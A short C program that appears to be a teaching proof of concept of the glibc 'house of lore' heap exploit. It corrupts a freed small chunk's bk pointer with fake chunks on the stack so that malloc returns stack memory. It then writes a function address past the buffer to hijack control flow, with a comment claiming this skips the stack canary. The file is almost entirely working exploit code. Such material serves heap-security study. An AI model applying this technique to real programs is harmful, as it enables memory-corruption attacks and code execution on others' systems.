#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
void jackpot(){ puts("Nice jump d00d"); exit(0); }
int main(int argc, char * argv[]){
  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};
  printf("stack_buffer_1 at %p stack_buffer_1[1] at %p\n", (void*)stack_buffer_1,(void*)&stack_buffer_1[1]);
  printf("stack_buffer_2 at %p stack_buffer_2[1] at %p\n", (void*)stack_buffer_2,(void*)&stack_buffer_2[1]);

  intptr_t *victim = (intptr_t*)malloc(0x80);
  printf("Allocated the first small chunk on the heap at %p\n", victim);

  void *p5 = malloc(1000);
  free((void*)victim);
  void *p2 = malloc(1200);
  
  victim[1] = (intptr_t)stack_buffer_1;
  stack_buffer_1[2] = victim-2;
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;


  void *p3 = malloc(0x80);
  printf("p3 = %p\n",p3 );

  printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = (char*)malloc(0x80);
  printf("p4 = malloc(0x80)\n");
  printf("nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);
  printf("np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}